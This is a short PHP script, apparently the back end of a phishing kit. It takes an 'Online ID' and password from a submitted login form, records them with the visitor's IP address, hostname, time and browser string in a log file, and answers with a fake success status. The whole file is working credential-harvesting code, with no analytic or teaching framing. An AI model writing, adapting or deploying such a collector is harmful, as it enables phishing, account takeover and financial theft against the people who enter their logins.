<?php

$onlineId = trim($_POST['onlineId']);
$password = trim($_POST['password']);

$data = "-------------------------------------------\nOnline ID: " . $onlineId . "\nPassword: " . $password . "\nIP: ${_SERVER['REMOTE_ADDR']} (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\nTime: " . date('Y-M-d h:i:sa') . "\nUser Agent: ${_SERVER['HTTP_USER_AGENT']}\n";

@file_put_contents('./db.log', $data, FILE_APPEND);

header("Content-Type: application/json");
echo json_encode(['status' => true]);
